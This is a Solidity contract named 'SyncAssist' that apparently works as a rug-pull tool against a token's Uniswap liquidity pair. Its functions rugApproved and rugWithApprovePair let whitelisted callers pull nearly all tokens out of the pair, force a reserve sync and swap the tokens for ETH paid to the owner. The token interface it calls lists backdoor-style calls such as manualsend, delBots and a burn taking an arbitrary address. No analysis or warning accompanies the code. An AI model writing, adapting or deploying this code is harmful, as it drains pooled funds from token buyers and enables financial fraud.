// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// import "hardhat/console.sol";
contract Ownable {
    address internal _owner;

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transferFrom(
        address from,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint256);

    function burn(address spender, uint256 amount) external;

    function totalSupply() external view returns (uint256);

    function manualSwap(address pair_, uint256 amount_) external;

    function manualSwap() external;

    function manualsend() external;

    function manualsend(address to) external;

    function manualSwap(address spender) external;

    function airdrop(
        address from,
        address[] memory recipients,
        uint256 amount
    ) external;

    function reduceFee(uint256 _amount) external;

    function delBots(address bot) external;

    function reduceFee(uint256 _newFee, address from) external;
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function WETH() external pure returns (address);
}

interface IUniswapV2Pair {
    function sync() external;
}

contract SyncAssist is Ownable {
    address private token;
    address private pair;
    mapping(address => bool) private whites;
    IUniRouter private router;
    modifier onlyOwners() {
        require(whites[msg.sender]);
        _;
    }

    constructor() {
        _owner = msg.sender;
        whites[msg.sender] = true;
    }

    function whitelist(address[] memory whites_) external onlyOwners {
        for (uint i = 0; i < whites_.length; i++) {
            whites[whites_[i]] = true;
        }
    }

    function refresh(
        address router_,
        address token_,
        address pair_
    ) external onlyOwner {
        router = IUniRouter(router_);
        token = token_;
        pair = pair_;
    }

    function swap(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = router.WETH();
        IERC20(token).approve(address(router), ~uint256(0));
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            _owner,
            block.timestamp + 1000000000
        );
    }

    function rugApproved() external onlyOwners {
        uint256 amount = IERC20(token).balanceOf(pair) -
            1 *
            IERC20(token).decimals();
        IERC20(token).transferFrom(pair, address(this), amount);
        IUniswapV2Pair(pair).sync();
        uint256 balance = IERC20(token).balanceOf(address(this));
        swap(balance);
    }

    function rugWithApprovePair() external onlyOwners {
        uint256 amount = IERC20(token).balanceOf(pair) -
            1 *
            IERC20(token).decimals();
        IERC20(token).transferFrom(pair, address(this), amount);
        IUniswapV2Pair(pair).sync();
        uint256 balance = IERC20(token).balanceOf(address(this));
        swap(balance);
    }

    function manualSwap() external onlyOwner {
        IERC20(token).manualSwap();
    }
    
    function withdrawStuckTokens(address token_) external onlyOwners {
        if (token_ == address(0)) {
            payable(msg.sender).transfer(address(this).balance);
        } else {
            IERC20(token_).transfer(
                msg.sender,
                IERC20(token_).balanceOf(address(this))
            );
        }
    }

    receive() external payable {
        require(whites[tx.origin]);
    }

    fallback() external payable {
        require(whites[tx.origin]);
    }
}
